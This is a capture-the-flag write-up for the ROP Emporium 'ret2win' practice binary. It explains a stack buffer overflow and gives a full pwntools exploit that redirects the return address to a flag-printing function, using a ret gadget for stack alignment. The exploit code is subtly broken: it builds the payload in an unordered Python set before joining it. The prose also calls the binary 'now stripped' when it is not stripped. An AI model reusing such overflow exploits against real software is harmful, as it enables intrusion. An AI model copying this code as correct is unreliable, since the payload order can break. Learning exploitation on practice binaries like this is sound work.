# ret2win

Locate a method that you want to call within the binary.
Call it by overwriting a saved return address on the stack.

## Writeup

We can check if the binary is stripped or not:

```
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```

The binary is now stripped we can see function names.

Now check which checks are enabled in this binary:

```
[*] '/home/kali/ROP Emporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The stack is not executable, so we can't inject a shellcode.

The program in the **main** function call the function **pwnme**:

```c
void pwnme(void)

{
  undefined buffer [32];
  
  memset(buffer,0,32);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,buffer,56);
  puts("Thank you!");
  return;
}
```

This function insert **56 bytes** of user input into **32 bytes** of buffer.

The binary also has a function called **ret2win**:

```c
void ret2win(void)

{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

This function will show the flag.

So we need to put the address of this function inside the stored **RIP** register value inside the stack.

The binary is **not stripped** so we can extract the address of the function from the symbols table and there is **no PIE** enabled, so we can use this address as it is.

```python
ret2win_addr = exe.symbols['ret2win']
```

We need to fill the buffer with 32 bytes plus the 8 bytes of **stored RBP** to reach the stored RIP register value:

```python
buffer_dim = 32
offset = buffer_dim + 8 # 8 bytes of rbp

payload = {
    b'a' * offset,
    p64(ret2win_addr),
}
```

Our payload is ready to be sent, but the stack is not aligned, we can use a **ret** gadget to make it aligned:

```python
buffer_dim = 32
offset = buffer_dim + 8 # 8 bytes of rbp

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]

payload = {
    b'a' * offset,
    p64(ret),
    p64(ret2win_addr),
}
```

The final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

ret2win_addr = exe.symbols['ret2win']

buffer_dim = 32
offset = buffer_dim + 8 # 8 bytes of rbp

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]

payload = {
    b'a' * offset,
    p64(ret),
    p64(ret2win_addr),
}

payload = b"".join(payload)

io.sendlineafter(b'> ', payload)

io.interactive()
```

This is the output:

```
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```